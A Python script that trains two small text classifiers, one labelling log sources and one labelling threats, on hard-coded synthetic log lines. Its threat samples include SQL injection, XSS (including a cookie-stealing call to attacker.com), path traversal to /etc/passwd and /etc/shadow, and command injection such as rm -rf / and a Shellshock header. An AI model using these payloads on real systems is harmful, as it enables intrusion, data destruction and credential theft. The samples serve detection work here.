import os
import joblib
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.pipeline import Pipeline
from sklearn.linear_model import LogisticRegression

# ─── Synthetic Training Data (Source Classification) ─────────────────────────

TRAINING_DATA = [
    # NGINX Access
    ("192.168.1.10 - - [10/Apr/2026:08:00:00 +0000] \"GET /index.html HTTP/1.1\" 200 1024", "nginx_access"),
    ("10.0.0.5 - - [12/Mar/2025:10:22:14 +0000] \"POST /api/login HTTP/2.0\" 401 56", "nginx_access"),
    ("GET /static/style.css HTTP/1.1 200", "nginx_access"),
    
    # Apache Error
    ("[Tue Apr 10 08:01:02.123 2026] [error] [client 192.168.1.10] File does not exist: /var/www/html/missing.html", "apache_error"),
    ("[Crit] [client 10.1.2.3] script '/var/www/login.php' not found", "apache_error"),
    ("AH00126: Invalid URI in request GET /xyz", "apache_error"),

    # Syslog (Auth / Linux)
    ("Apr 10 08:05:00 web-srv-01 sshd[1234]: Accepted publickey for jsmith from 10.0.1.50 port 45123 ssh2", "linux_auth"),
    ("Apr 10 08:06:00 web-srv-01 sshd[1234]: Failed password for invalid user root from 185.220.101.42 port 49122 ssh2", "linux_auth"),
    ("pam_unix(sshd:session): session opened for user deploy by (uid=0)", "linux_auth"),
    ("sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/bash", "linux_auth"),
    
    # Windows Security
    ("Successful logon from 10.0.1.50 for user admin", "windows_security"),
    ("Failed logon attempt from 185.220.101.42 for user admin (bad password)", "windows_security"),
    ("User \"svc_update\" added to Administrators group", "windows_security"),
    ("Special privileges assigned to logon", "windows_security"),
    ("Object access attempted", "windows_security"),
    
    # DB (MySQL / PostgreSQL)
    ("2026-04-10 08:10:00 [ERROR] InnoDB: Attempted to open a previously opened tablespace.", "db_mysql"),
    ("LOG:  statement: SELECT * FROM users WHERE id = 1;", "db_postgres"),
    ("FATAL:  password authentication failed for user \"root\"", "db_postgres"),

    # Application / Custom
    ("INFO: [AppService] Starting worker loops", "application"),
    ("ERROR: [PaymentGateway] Connection timeout communicating with API", "application"),
    ("WARN: Unhandled exception in user module.", "application")
]

# ─── Synthetic Training Data (Threat Classification) ─────────────────────────
THREAT_DATA = [
    # Benign variations
    ("Successful logon from 10.0.1.50 for user admin", "benign"),
    ("GET /index.html HTTP/1.1 200", "benign"),
    ("INFO: [AppService] Starting worker loops", "benign"),
    ("User admin successfully logged out", "benign"),
    ("LOG: statement: SELECT id, name FROM users WHERE id = 123;", "benign"),
    
    # SQL Injection
    ("GET /product?id=1' OR '1'='1 HTTP/1.1", "sql_injection"),
    ("POST /login username=admin' --", "sql_injection"),
    ("LOG: statement: SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1';", "sql_injection"),
    ("GET /api/data?q=1; DROP TABLE users;-- HTTP/1.1", "sql_injection"),
    ("username=admin'; EXEC xp_cmdshell('dir');--", "sql_injection"),
    
    # XSS (Cross Site Scripting)
    ("GET /search?q=<script>alert('xss')</script> HTTP/1.1", "xss"),
    ("POST /comment body=<img src=x onerror=alert(1)> HTTP/1.1", "xss"),
    ("GET /profile?name=javascript:prompt(1) HTTP/1.1", "xss"),
    ("Referer: \"><script>document.location='http://attacker.com/?cookie='+document.cookie</script>", "xss"),

    # Path Traversal
    ("GET /images?file=../../../../etc/passwd HTTP/1.1", "path_traversal"),
    ("GET /download.php?file=..%2F..%2F..%2F..%2Fetc%2Fshadow", "path_traversal"),
    ("Failed to open file: /var/www/html/../../../../etc/hostname", "path_traversal"),
    ("GET /assets?path=..\\..\\..\\windows\\system32\\cmd.exe", "path_traversal"),

    # Command Injection
    ("GET /ping?ip=127.0.0.1; cat /etc/passwd HTTP/1.1", "command_injection"),
    ("POST /upload filename=test.txt; rm -rf /; HTTP/1.1", "command_injection"),
    ("User-Agent: () { :;}; echo Content-Type: text/plain; echo; /bin/ls -l", "command_injection"),
    ("GET /api/tool?target=google.com & whoami HTTP/1.1", "command_injection")
]

X_train_src = [item[0] for item in TRAINING_DATA] * 10
y_train_src = [item[1] for item in TRAINING_DATA] * 10

X_train_thr = [item[0] for item in THREAT_DATA] * 10
y_train_thr = [item[1] for item in THREAT_DATA] * 10


def main():
    print("Initiating local AI model training...")
    
    # Train Source Model
    pipeline_src = Pipeline([
        ('tfidf', TfidfVectorizer(ngram_range=(1, 2), stop_words='english')),
        ('clf', LogisticRegression(random_state=42, C=1.0, max_iter=1000))
    ])
    pipeline_src.fit(X_train_src, y_train_src)
    src_model_path = os.path.join(os.path.dirname(__file__), 'ai_source_model.pkl')
    joblib.dump(pipeline_src, src_model_path)
    print(f"Source Model successfully saved to: {src_model_path}")

    # Train Threat Model
    pipeline_thr = Pipeline([
        ('tfidf', TfidfVectorizer(ngram_range=(1, 2), stop_words='english')),
        ('clf', LogisticRegression(random_state=42, C=1.0, max_iter=1000))
    ])
    pipeline_thr.fit(X_train_thr, y_train_thr)
    thr_model_path = os.path.join(os.path.dirname(__file__), 'ai_threat_model.pkl')
    joblib.dump(pipeline_thr, thr_model_path)
    print(f"Threat Model successfully saved to: {thr_model_path}")

if __name__ == "__main__":
    main()
